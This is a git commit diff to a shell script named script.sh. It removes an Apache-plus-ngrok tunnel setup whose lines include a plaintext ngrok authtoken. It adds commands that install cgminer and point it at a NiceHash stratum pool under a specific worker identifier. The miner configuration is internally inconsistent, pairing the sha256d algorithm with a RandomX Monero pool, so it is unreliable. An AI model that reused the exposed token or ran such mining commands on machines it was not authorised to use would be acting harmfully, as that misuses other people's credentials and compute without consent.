80ceaefec103af58a3b2fe89fcaaf08c665a36ea
humfla123 <88781888+humfla123@users.noreply.github.com>
2023-02-13 18:12:00 -0300

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,6 +1,3 @@
-apt update
-apt install apache2
-curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && apt update && apt install ngrok
-ngrok config add-authtoken 26l2eR5cm1MuLRoKVXkVn3UQzHk_6WzTXhwxmHegKUvQsxwVu
-service apache2 restart
-ngrok tcp 80
+apt-get update
+apt-get install cgminer
+cgminer -a sha256d -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbHFgjeCX3CsyYQSKqVXDFnuySebT6g2dhp -p x
